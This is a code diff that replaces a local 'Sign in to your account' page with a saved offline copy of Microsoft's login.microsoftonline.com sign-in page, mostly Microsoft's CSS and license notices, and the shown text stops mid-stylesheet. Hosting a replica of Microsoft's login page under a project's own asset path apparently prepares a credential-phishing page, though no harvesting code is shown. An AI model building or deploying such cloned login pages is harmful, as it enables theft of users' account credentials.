@@ -1,17 +1,84 @@
-<!DOCTYPE html>
-<html class="" dir="ltr" lang="en">
-<head>
-  <meta charset="utf-8"/>
-  <title>Sign in to your account</title>
-  <meta content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes" name="viewport"/>
-  <link href="/microsoft-webpage/assets/img_12e3dac8-C_Ub-jv0.x-icon" rel="shortcut icon"/>
-  <link rel="stylesheet" crossorigin href="/microsoft-webpage/assets/sign_in-BSdFkjMv.css">
-</head>
-<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass" style="display:block">
+<!DOCTYPE html> <html dir=ltr class lang=en><!--
+ Page saved with SingleFile 
+ url: https://login.microsoftonline.com/common/oauth2/v2.0/authorize?scope=service%3A%3Aaccount.microsoft.com%3A%3AMBI_SSL%20openid%20profile%20offline_access&response_type=code&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin-oauth&client-request-id=0de96121-10a6-4d4e-9854-e30317d5b82a&x-client-SKU=MSAL.Desktop&x-client-Ver=4.79.2.0&prompt=login&client_info=1&state=H4sIAAAAAAAEAAXBx2KCMAAA0H_plYOC0MLBAysgw8iQdbMCQWIYaYjA1_e9L3XdgT5fcJcacvfJxQGUI_P0U10koiEZCE_dI7rNjbip0NnLOHui1fcMUv-MOcL3Zyu8ZDegfh9q8Wqe6r6aRmArYxmISrCrUb-_BlbiOoMfA4CiHUgsaJCbsEfVQd5uI7wGR9r5jDFUcXdR1DiJ3hpJn9nMycYqK4T9lDk4N_mfatLF65kkFCjEw8oj5SQVminfhUyaD0OjE6KzQXUmm0ssxvunUCJqbwex_m0Zudm1BxGpO4F04zsM4kfxPecY-IoIL8cHLbVcTb231O6gSyxqgQ9CLnOb9NWYWZdKBT5qFQ14vyS-eh1Hy96labrnFQ2bBeoOly-tbC-c-eh8_voHH_4CSVoBAAA&msaoauth2=true&instance_aware=true&lc=1033 
+ saved date: Wed Jul 08 2026 14:49:02 GMT+0100 (West Africa Time)
+--><meta charset=utf-8>
+<title>Sign in to your account</title>
+<meta http-equiv=X-UA-Compatible content="IE=edge">
+<meta name=viewport content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
+<meta http-equiv=Pragma content=no-cache>
+<meta http-equiv=Expires content=-1>
+<meta http-equiv=x-dns-prefetch-control content=on>
+<meta name=PageID content=ConvergedSignIn>
+<meta name=SiteID content>
+<meta name=ReqLC content=1033>
+<meta name=LocLC content=en-US>
+<meta name=format-detection content="telephone=no">
+<meta name=robots content=none>
+<style>/*! Copyright (C) Microsoft Corporation. All rights reserved. *//*!
+------------------------------------------- START OF THIRD PARTY NOTICE -----------------------------------------
+
+This file is based on or incorporates material from the projects listed below (Third Party IP). The original copyright notice and the license under which Microsoft received such Third Party IP, are set forth below. Such licenses and notices are provided for informational purposes only. Microsoft licenses the Third Party IP to you under the licensing terms for the Microsoft product. Microsoft reserves all other rights not expressly granted under this agreement, whether by implication, estoppel or otherwise.
+
+//-----------------------------------------------------------------------------
+twbs-bootstrap-sass (3.3.0)
+//-----------------------------------------------------------------------------
+
+The MIT License (MIT)
+
+Copyright (c) 2013 Twitter, Inc
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in
+all copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
+THE SOFTWARE.
+
+//-----------------------------------------------------------------------------
+necolas-normalize.css (3.0.2)
+//-----------------------------------------------------------------------------
+! normalize.css v3.0.2 | MIT License | git.io/normalize
+
+Copyright (c) Nicolas Gallagher and Jonathan Neal
+
+Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
+
+Provided for Informational Purposes Only
+MIT License
+Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the Software), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
+The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
+MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
+NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE
+LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION
+OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
+WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
+*//*! normalize.css v3.0.2 | MIT License | git.io/normalize */html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}a{background-color:transparent}a:active,a:hover{outline:0}img{border:0}input{color:inherit;font:inherit;margin:0}html input[type="button"],input[type="submit"]{-webkit-appearance:button;cursor:pointer}button::-moz-focus-inner,input::-moz-focus-inner{border:0;padding:0}input[type="number"]::-webkit-inner-spin-button,input[type="number"]::-webkit-outer-spin-button{height:auto}input[type="search"]::-webkit-search-cancel-button,input[type="search"]::-webkit-search-decoration{-webkit-appearance:none}*{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}*:before,*:after{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}input{font-family:inherit;font-size:inherit}a:focus{outline:thin dotted;outline-offset:-2px;outline:5px auto -webkit-focus-ring-color}img{vertical-align:middle}.sr-only-focusable:active,.sr-only-focusable:focus{position:static;width:auto;height:auto;margin:0;overflow:visible;clip:auto}html{font-size:100%}body{font-family:"Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";font-weight:400;font-size:.9375rem;line-height:1.25rem;padding-bottom:.227px;padding-top:.227px;background-color:#fff}a{color:#ccc;text-decoration:none}a:link{color:#0067b8}a:visited{color:#0067b8}a:hover{color:#666}a:focus{color:#0067b8}a:active{color:#999}@font-face{font-family:"Segoe UI Webfont";src:local("Segoe UI Light");font-weight:200;font-style:normal}@font-face{font-family:"Segoe UI Webfont";src:local("Segoe UI");font-weight:400;font-style:normal}@font-face{font-family:"Segoe UI Webfont";src:local("Segoe UI Semibold");font-weight:600;font-style:normal}.text-left{text-align:left}.container:before,.container:after,.container-fluid:before,.container-fluid:after{content:" ";display:table}.container:after,.container-fluid:after{clear:both}.row:before,.row:after{content:" ";display:table}.row:after{clear:both}.col-xs-24,.col-md-24{position:relative;min-height:1px;padding-left:2px;padding-right:2px}.col-xs-24{float:left}.col-xs-24{width:100%}@media (min-width:768px){.col-md-24{float:left}.col-md-24{width:100%}}input[type="file"]:focus,input[type="radio"]:focus,input[type="checkbox"]:focus{outline:thin dotted;outline-offset:-2px;outline:5px auto -webkit-focus-ring-color}.form-control{display:block;width:100%;background-image:none}input{max-width:100%;line-height:inherit}input[type="email"],input[type="password"]{border-style:solid}input[type="color"]:focus,input[type="date"]:focus,input[type="datetime"]:focus,input[type="datetime-local"]:focus,input[type="email"]:focus,input[type="month"]:focus,input[type="number"]:focus,input[type="password"]:focus,input[type="search"]:focus,input[type="tel"]:focus,input[type="text"]:focus,input[type="time"]:focus,input[type="url"]:focus,input[type="week"]:focus,textarea:focus{border-color:#0067b8;background-color:#fff}input[type="color"]::-moz-placeholder,input[type="date"]::-moz-placeholder,input[type="datetime"]::-moz-placeholder,input[type="datetime-local"]::-moz-placeholder,input[type="email"]::-moz-placeholder,input[type="month"]::-moz-placeholder,input[type="number"]::-moz-placeholder,input[type="password"]::-moz-placeholder,input[type="search"]::-moz-placeholder,input[type="tel"]::-moz-placeholder,input[type="text"]::-moz-placeholder,input[type="time"]::-moz-placeholder,input[type="url"]::-moz-placeholder,input[type="week"]::-moz-placeholder,textarea::-moz-placeholder{color:rgba(0,0,0,0.6);opacity:1}input[type="color"]:-ms-input-placeholder,input[type="date"]:-ms-input-placeholder,input[type="datetime"]:-ms-input-placeholder,input[type="datetime-local"]:-ms-input-placeholder,input[type="email"]:-ms-input-placeholder,input[type="month"]:-ms-input-placeholder,input[type="number"]:-ms-input-placeholder,input[type="password"]:-ms-input-placeholder,input[type="search"]:-ms-input-placeholder,input[type="tel"]:-ms-input-placeholder,input[type="text"]:-ms-input-placeholder,input[type="time"]:-ms-input-placeholder,input[type="url"]:-ms-input-placeholder,input[type="week"]:-ms-input-placeholder,textarea:-ms-input-placeholder{color:rgba(0,0,0,0.6)}input[type="color"]::-webkit-input-placeholder,input[type="date"]::-webkit-input-placeholder,input[type="datetime"]::-webkit-input-placeholder,input[type="datetime-local"]::-webkit-input-placeholder,input[type="email"]::-webkit-input-placeholder,input[type="month"]::-webkit-input-placeholder,input[type="number"]::-webkit-input-placeholder,input[type="password"]::-webkit-input-placeholder,input[type="search"]::-webkit-input-placeholder,input[type="tel"]::-webkit-input-placeholder,input[type="text"]::-webkit-input-placeholder,input[type="time"]::-webkit-input-placeholder,input[type="url"]::-webkit-input-placeholder,input[type="week"]::-webkit-input-placeholder,textarea::-webkit-input-placeholder{color:rgba(0,0,0,0.6)}input::-ms-clear,input::-ms-reveal{height:100%;padding:4px 8px;margin-right:-8px;margin-left:4px}input::-ms-clear:hover,input::-ms-reveal:hover{color:#0067b8}input::-ms-clear:active,input::-ms-reveal:active{color:#fff;background-color:#0067b8}.form-group.has-error input::-ms-clear:hover,.form-group.has-error input::-ms-reveal:hover,input.has-error::-ms-clear:hover,input.has-error::-ms-reveal:hover{color:#e81123}.form-group.has-error input::-ms-clear:active,.form-group.has-error input::-ms-reveal:active,input.has-error::-ms-clear:active,input.has-error::-ms-reveal:active{color:#fff;background-color:#e81123}input[type="radio"]::-ms-check{background-color:#fff;color:#000;border-style:solid;border-width:2px;border-color:rgba(0,0,0,0.6)}input[type="radio"]:checked::-ms-check{color:#000;border-color:#0067b8}input[type="radio"]:hover::-ms-check{border-color:#000}input[type="radio"]:hover:checked::-ms-check{border-color:#0067b8}input[type="radio"]:active::-ms-check{color:rgba(0,0,0,0.6);border-color:rgba(0,0,0,0.6)}input[type="radio"]:active:checked::-ms-check{border-color:rgba(0,0,0,0.6)}input[type="radio"][disabled]::-ms-check,fieldset[disabled] input[type="radio"]::-ms-check{background-color:#fff!important;color:rgba(0,0,0,0.2)!important;border-color:rgba(0,0,0,0.2)!important}input[type="radio"][disabled]:checked::-ms-check,fieldset[disabled] input[type="radio"]:checked::-ms-check{color:rgba(0,0,0,0.2)!important}input[type="checkbox"]::-ms-check{border-style:solid;border-width:2px;background-color:transparent;color:#000;border-color:rgba(0,0,0,0.8)}input[type="checkbox"]:checked::-ms-check{background-color:#0067b8;border-color:#0067b8}input[type="checkbox"]:hover::-ms-check{border-color:#000}input[type="checkbox"]:active::-ms-check{background-color:rgba(0,0,0,0.6);border-color:transparent}input[type="checkbox"][disabled]::-ms-check,fieldset[disabled] input[type="checkbox"]::-ms-check{border-color:rgba(0,0,0,0.2)!important;background-color:transparent!important;color:rgba(0,0,0,0.2)!important}progress::-ms-fill{color:#0067b8}progress::-webkit-progress-value{background-color:#0067b8}progress::-webkit-progress-bar{background-color:#ccc}progress::-moz-progress-bar{background-color:#0067b8}input[type="range"]::-ms-track{height:2px;border-style:none;background-color:transparent;color:transparent}input[type="range"]::-ms-fill-lower{background-color:#0067b8}input[type="range"]::-ms-fill-upper{background-color:rgba(0,0,0,0.4)}input[type="range"]::-ms-thumb{background-color:#0067b8;width:24px;height:8px;border-radius:4px;border-style:none}input[type="range"]:hover::-ms-thumb{background-color:#1f1f1f}input[type="range"]:active::-ms-thumb{background-color:#ccc}input[type="range"]:disabled::-ms-fill-lower,input[type="range"]:disabled::-ms-fill-upper{background-color:rgba(0,0,0,0.2)!important}input[type="range"]:disabled::-ms-thumb{background-color:#ccc!important}select:focus option{background-color:#fff}select:hover{border-color:rgba(0,0,0,0.6)}select:active{background-color:#fff}select[multiple]:focus{background-color:#fff}select[disabled] option:hover,select[disabled] option:focus,select[disabled] option:active,select.disabled option:hover,select.disabled option:focus,select.disabled option:active,fieldset[disabled] select option:hover,fieldset[disabled] select option:focus,fieldset[disabled] select option:active{background-color:transparent!important}::-ms-expand{margin:0 6px 0 20px;background-color:transparent;border:0}input[type="button"],input[type="submit"]{padding:4px 12px 4px 12px;position:relative;max-width:100%;text-align:center;white-space:nowrap;overflow:hidden;vertical-align:middle;text-overflow:ellipsis;touch-action:manipulation;border-style:solid;border-width:2px}.btn:hover,.btn:focus,button:hover,button:focus,input[type="button"]:hover,input[type="button"]:focus,input[type="submit"]:hover,input[type="submit"]:focus,input[type="reset"]:hover,input[type="reset"]:focus{border-color:rgba(0,0,0,0.4)}.btn:hover,button:hover,input[type="button"]:hover,input[type="submit"]:hover,input[type="reset"]:hover{cursor:pointer}.btn:active,button:active,input[type="button"]:active,input[type="submit"]:active,input[type="reset"]:active{background-color:rgba(0,0,0,0.4);border-color:transparent}.btn.btn-primary:hover,.btn.btn-primary:focus,button.btn-primary:hover,button.btn-primary:focus,input[type="button"].btn-primary:hover,input[type="button"].btn-primary:focus,input[type="submit"].btn-primary:hover,input[type="submit"].btn-primary:focus,input[type="reset"].btn-primary:hover,input[type="reset"].btn-primary:focus{border-color:#004e8c}.btn.btn-primary:active,button.btn-primary:active,input[type="button"].btn-primary:active,input[type="submit"].btn-primary:active,input[type="reset"].btn-primary:active{background-color:rgba(0,0,0,0.4);border-color:transparent}a.btn:link,a.btn:visited{color:#000}a.btn.btn-primary:link,a.btn.btn-primary:visited{color:#fff}.person:focus{outline-style:none;border-color:#000}.table{max-width:100%}.dropdown-toggle:focus{outline:0}.dropdown-menu>li>a:hover,.dropdown-menu>li>a:focus{text-decoration:none;color:#262626;background-color:#f5f5f5}.dropdown-menu>.active>a:hover,.dropdown-menu>.active>a:focus{color:#fff;text-decoration:none;outline:0;background-color:#428bca}.dropdown-menu>.disabled>a:hover,.dropdown-menu>.disabled>a:focus{color:#777}.dropdown-menu>.disabled>a:hover,.dropdown-menu>.disabled>a:focus{text-decoration:none;background-color:transparent;background-image:none;filter:progid:DXImageTransform.Microsoft.gradient(enabled=false);cursor:not-allowed}.btn-group:before,.btn-group:after{content:" ";display:table}.btn-group:after{clear:both}.input-group-btn>.btn:hover,.input-group-btn>.btn:focus,.input-group-btn>.btn:active{z-index:2}.modal-footer:before,.modal-footer:after{content:" ";display:table}.modal-footer:after{clear:both}.clearfix:before,.clearfix:after{content:" ";display:table}.clearfix:after{clear:both}@-ms-viewport{width:device-width}@font-face{font-family:"Segoe UI Webfont";font-weight:300;src:local("Segoe UI Semilight")}@font-face{font-family:"Segoe UI Webfont";font-style:italic;font-weight:400;src:local("Segoe UI Italic")}@font-face{font-family:"Segoe UI Webfont";font-style:italic;font-weight:700;src:local("Segoe UI Bold Italic")}a:focus{outline-offset:0}input[type="file"]:focus,input[type="radio"]:focus,input[type="checkbox"]:focus{outline-offset:0}body{direction:ltr}.ltr_override{direction:ltr;text-align:left}.text-secondary{color:rgba(0,0,0,0.7);font-size:13px}body.cb .text-13{font-size:.8125rem}body.cb div.placeholderContainer{width:100%;position:relative}body.cb #signup{white-space:nowrap}.no-padding-left-right{padding-left:0;padding-right:0}@keyframes pulse{from{opacity:.4}}@-o-keyframes pulse{from{opacity:.4}}@-moz-keyframes pulse{from{opacity:.4}}@-webkit-keyframes pulse{from{opacity:.4}}.row.tile:focus .progress>div,.row.tile:focus:hover .progress>div,.row.tile:active .progress>div{background-color:#fff}@-webkit-keyframes progressDot{0%,20%{left:0;-webkit-animation-timing-function:ease-out;opacity:0}25%{opacity:1}35%{left:45%;-webkit-animation-timing-function:linear}65%{left:60%;-webkit-animation-timing-function:ease-in}75%{opacity:1}80%,100%{left:100%;opacity:0}}@-moz-keyframes progressDot{0%,20%{left:0;-moz-animation-timing-function:ease-out;opacity:0}25%{opacity:1}35%{left:45%;-moz-animation-timing-function:linear}65%{left:60%;-moz-animation-timing-function:ease-in}75%{opacity:1}80%,100%{left:100%;opacity:0}}@-o-keyframes progressDot{0%,20%{left:0;-o-animation-timing-function:ease-out;opacity:0}25%{opacity:1}35%{left:45%;-o-animation-timing-function:linear}65%{left:60%;-o-animation-timing-function:ease-in}75%{opacity:1}80%,100%{left:100%;opacity:0}}@keyframes progressDot{0%,20%{left:0;animation-timing-function:ease-out;opacity:0}25%{opacity:1}35%{left:45%;animation-timing-function:linear}65%{left:60%;animation-timing-function:ease-in}75%{opacity:1}80%,100%{left:100%;opacity:0}}@keyframes fadeIn{from{opacity:0}to{opacity:1}}@-o-keyframes fadeIn{from{opacity:0}to{opacity:1}}@-moz-keyframes fadeIn{from{opacity:0}to{opacity:1}}@-webkit-keyframes fadeIn{from{opacity:0}to{opacity:1}}body.cb{color:#1b1b1b;text-align:left}body:lang(zh){font-family:"Segoe UI",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math"}.background-image{-webkit-animation:fadeIn 1s;-moz-animation:fadeIn 1s;-o-animation:fadeIn 1s;animation:fadeIn 1s}.background-image-holder{background:#f2f2f2}.background-image-holder,.background-image{position:fixed;top:0;width:100%;height:100%}.background-image{background-repeat:no-repeat,no-repeat;background-position:center center,center center;background-size:cover,cover}.footer{position:absolute;left:0;bottom:0;width:100%;overflow:visible;z-index:99;clear:both;min-height:28px}div.footerNode{margin:0;float:right}.footer-content.footer-item{color:#000;font-size:12px;line-height:28px;white-space:nowrap;display:inline-block;margin-left:8px;margin-right:8px}.footer-content.footer-item.debug-item{text-decoration:none;letter-spacing:3px;line-height:22px;vertical-align:top;font-size:16px;font-weight:600}.outer{display:table;position:absolute;height:100%;width:100%}.middle{display:table-cell;vertical-align:middle}.sign-in-box{margin-left:auto;margin-right:auto;position:relative;max-width:440px;width:calc(100% - 40px);padding:44px;background-color:#fff;-webkit-box-shadow:0 2px 6px rgba(0,0,0,0.2);-moz-box-shadow:0 2px 6px rgba(0,0,0,0.2);box-shadow:0 2px 6px rgba(0,0,0,0.2);min-width:320px;min-height:338px;overflow:hidden}.sign-in-box.has-popup{margin-bottom:20px}a:hover{text-decoration:underline}.promoted-fed-cred-box{margin-left:auto;margin-right:auto;position:relative;max-width:440px;width:calc(100% - 40px);margin-bottom:28px;line-height:16px;min-width:320px;padding:0}.promoted-fed-cred-box>*{word-wrap:break-word}.promoted-fed-cred-content{background-color:#fff;-webkit-box-shadow:0 2px 6px rgba(0,0,0,0.2);-moz-box-shadow:0 2px 6px rgba(0,0,0,0.2);box-shadow:0 2px 6px rgba(0,0,0,0.2);padding-left:44px;padding-right:44px}.promoted-fed-cred-content .row.tile .table{padding-top:8px;padding-bottom:8px}.template-section{display:table-row}.template-section.main-section{height:100%}input[type="email"],input[type="password"]{padding:6px 10px;border-width:1px;border-color:rgba(0,0,0,0.6);outline:none;border-radius:0;-webkit-border-radius:0;background-color:transparent}input[type="color"]:hover,input[type="date"]:hover,input[type="datetime"]:hover,input[type="datetime-local"]:hover,input[type="email"]:hover,input[type="month"]:hover,input[type="number"]:hover,input[type="password"]:hover,input[type="search"]:hover,input[type="tel"]:hover,input[type="text"]:hover,input[type="time"]:hover,input[type="url"]:hover,input[type="week"]:hover,textarea:hover,select:hover{border-color:#323232;border-color:rgba(0,0,0,0.8)}input[type="color"]:focus,input[type="date"]:focus,input[type="datetime"]:focus,input[type="datetime-local"]:focus,input[type="email"]:focus,input[type="month"]:focus,input[type="number"]:focus,input[type="password"]:focus,input[type="search"]:focus,input[type="tel"]:focus,input[type="text"]:focus,input[type="time"]:focus,input[type="url"]:focus,input[type="week"]:focus,textarea:focus,select:focus{border-color:#0067b8;background-color:transparent}input[type="color"].has-error:focus,input[type="date"].has-error:focus,input[type="datetime"].has-error:focus,input[type="datetime-local"].has-error:focus,input[type="email"].has-error:focus,input[type="month"].has-error:focus,input[type="number"].has-error:focus,input[type="password"].has-error:focus,input[type="search"].has-error:focus,input[type="tel"].has-error:focus,input[type="text"].has-error:focus,input[type="time"].has-error:focus,input[type="url"].has-error:focus,input[type="week"].has-error:focus,textarea.has-error:focus,select.has-error:focus{border-color:#e81123}input[type="button"],input[type="submit"]{min-height:32px;border:none;min-width:108px;line-height:normal}.btn:hover,button:hover,input[type="button"]:hover,input[type="submit"]:hover,input[type="reset"]:hover{background-color:#b2b2b2;background-color:rgba(0,0,0,0.3)}.btn:focus,button:focus,input[type="button"]:focus,input[type="submit"]:focus,input[type="reset"]:focus{background-color:#b2b2b2;background-color:rgba(0,0,0,0.3);text-decoration:underline;outline:2px solid #000}.btn.btn-primary:hover,button.btn-primary:hover,input[type="button"].btn-primary:hover,input[type="submit"].btn-primary:hover,input[type="reset"].btn-primary:hover{background-color:#005da6}.btn.btn-primary:focus,button.btn-primary:focus,input[type="button"].btn-primary:focus,input[type="submit"].btn-primary:focus,input[type="reset"].btn-primary:focus{background-color:#005da6;text-decoration:underline;outline:2px solid #000}.btn:active,button:active,input[type="button"]:active,input[type="submit"]:active,input[type="reset"]:active,.btn.btn-primary:active,button.btn-primary:active,input[type="button"].btn-primary:active,input[type="submit"].btn-primary:active,input[type="reset"].btn-primary:active{outline:none;text-decoration:none;-ms-transform:scale(.98);-webkit-transform:scale(.98);transform:scale(.98)}.button.secondary{padding:4px 12px 4px 12px;position:relative;max-width:100%;text-align:center;white-space:nowrap;overflow:hidden;vertical-align:middle;text-overflow:ellipsis;touch-action:manipulation;color:#000;border-style:solid;border-width:2px;border-color:transparent;min-height:32px;border:none;background-color:rgba(0,0,0,0.2);min-width:108px;line-height:normal;margin-top:0;margin-bottom:0;display:block;width:100%}.button.secondary:hover{background-color:#b2b2b2;background-color:rgba(0,0,0,0.3)}.button.secondary:focus{background-color:#b2b2b2;background-color:rgba(0,0,0,0.3);text-decoration:underline;outline:2px solid #000}.button.secondary:active{outline:none;text-decoration:none;-ms-transform:scale(.98);-webkit-transform:scale(.98);transform:scale(.98)}.button.primary{color:#fff;border-color:#0067b8;background-color:#0067b8;display:block;width:100%}.button.primary:hover{background-color:#005da6}.button.primary:focus{background-color:#005da6;text-decoration:underline;outline:2px solid #000}.button.primary:active{outline:none;text-decoration:none;-ms-transform:scale(.98);-webkit-transform:scale(.98);transform:scale(.98)}.button_primary-danger .button.primary:hover{background-color:#a4262c!important}.button_primary-danger .button.primary:focus{background-color:#a4262c!important}.button_primary-danger .button.primary:active{background-color:#a4262c!important}.logo{max-width:256px;height:24px}.backButton:hover{background-color:#e6e6e6;background-color:rgba(0,0,0,0.1)}.backButton:hover:focus{background-color:#ccc;background-color:rgba(0,0,0,0.2)}.backButton:active{background-color:#b3b3b3;background-color:rgba(0,0,0,0.3)}.backButton:focus{background-color:#e6e6e6;background-color:rgba(0,0,0,0.1)}.tile-container{position:relative}.table{width:100%;display:table;table-layout:fixed}.table .table-row{display:table-row}.table .table-cell{display:table-cell;vertical-align:middle}.row{margin-left:0;margin-right:0}.row.tile{margin-bottom:0;outline:none;color:inherit;display:block;margin-left:-44px;margin-right:-44px}.row.tile:not(.no-pick){cursor:pointer}.row.tile:not(.no-pick):hover{background-color:#e6e6e6;background-color:rgba(0,0,0,0.1);color:inherit}.row.tile:not(.no-pick):active{background-color:#b3b3b3;background-color:rgba(0,0,0,0.3);color:inherit}.row.tile .content{line-height:16px;padding-left:12px;padding-right:12px}.row.tile .content>*{word-wrap:break-word}.row.tile .table{padding:12px 44px}.row.tile .table:focus{outline:#000 dashed 1px;background:#ccc;background:rgba(0,0,0,0.1)}.row.tile .table-cell:first-child+.table-cell{width:100%}.tile-img{position:relative}.tile-img.medium{width:32px;height:32px}.form-group{margin-bottom:16px}input[type="button"],input[type="submit"]{margin-top:0;margin-bottom:0}.menu-dots>div:focus{outline:#000 dashed 1px;background:none}.menu li a:focus{outline:#000 dashed 1px;background-color:#e6e6e6;background-color:rgba(0,0,0,0.1)}.menu li a:hover{background-color:#e6e6e6;background-color:rgba(0,0,0,0.1)}.menu li a:active{background-color:#b3b3b3;background-color:rgba(0,0,0,0.3)}.moveOffScreen{position:fixed;bottom:0;right:0;height:0!important;width:0!important;overflow:hidden;opacity:0;filter:alpha(opacity=0)}.display-sign-container .displaySign:focus::before{position:absolute;top:-0.75rem;bottom:-0.75rem;left:-0.75rem;right:-0.75rem;border:2px solid #000;content:"";pointer-events:none}.position-buttons>div:first-child{display:inline-block;width:100%;margin-bottom:36px}.button-container{position:absolute;bottom:0;right:0;text-align:right}@media (max-width:600px),(max-height:366px){.background-image-holder,.background-image{display:none}.middle{vertical-align:top}.sign-in-box{padding:24px;margin-top:0;width:100vw;-webkit-box-shadow:none;-moz-box-shadow:none;box-shadow:none;border:0}.sign-in-box.has-popup{padding-bottom:0;margin-bottom:0}.promoted-fed-cred-box{margin-top:0;margin-bottom:88px;width:100vw;padding:0 24px}.promoted-fed-cred-content{-webkit-box-shadow:none;-moz-box-shadow:none;box-shadow:none;padding-left:24px;padding-right:24px;border:1px solid rgba(0,0,0,0.4)}.row.tile{margin-left:-24px;margin-right:-24px}.row.tile .table{padding:12px 24px}.footer{background-color:#fff;filter:none}div.footerNode{float:left;margin:0 24px!important}.footer-content.footer-item{color:#747474}}.inline-block{display:inline-block}input[type="email"],input[type="password"]{border-top-width:0;border-left-width:0;border-right-width:0;padding-left:0}.input.text-box{border-style:solid;padding:6px 10px;border-width:1px;border-color:rgba(0,0,0,0.6);height:36px;outline:none;border-radius:0;-webkit-border-radius:0;background-color:transparent;border-top-width:0;border-left-width:0;border-right-width:0;padding-left:0}.input.text-box:focus{background-color:#fff;border-color:#0067b8;background-color:transparent}.input.text-box:hover{border-color:#323232;border-color:rgba(0,0,0,0.8)}.input.text-box::-moz-placeholder{color:rgba(0,0,0,0.6);opacity:1}.input.text-box:-ms-input-placeholder{color:rgba(0,0,0,0.6)}.input.text-box::-webkit-input-placeholder{color:rgba(0,0,0,0.6)}.input.text-box.has-error:focus{border-color:#e81123}select:hover{background:transparent}select:focus{background:#eee}.text-title:lang(zh-cn),.text-title:lang(zh-tw),.text-title p:lang(zh-cn),.text-title p:lang(zh-tw){font-family:"Segoe UI","Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math"}.title{line-height:1.75rem;padding-bottom:2.3632px;padding-top:2.3632px;color:#1b1b1b;font-size:1.5rem;font-weight:600;padding:0;margin-top:16px;margin-bottom:12px;font-family:"Segoe UI","Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New 